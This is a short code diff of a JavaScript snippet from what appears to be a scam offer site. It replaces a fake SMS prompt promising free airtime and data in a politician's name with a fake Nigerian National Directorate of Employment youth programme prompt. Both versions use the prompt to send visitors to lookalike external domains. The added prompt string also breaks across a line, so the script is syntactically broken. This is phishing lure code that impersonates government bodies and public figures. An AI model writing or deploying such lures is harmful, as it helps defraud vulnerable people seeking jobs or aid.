@@ -1,6 +1,7 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = 'OK'
+password=prompt('SMS: Welcome To The National Directorate of Employment (NDE) Online Portal to Engage 900,000 Youths in Skills Development.
+, Kindly Press OK to Continue ','OK');
+if (password != 'OK') {
+location.href='https://nderegistration.programs.lat/Job';
 }
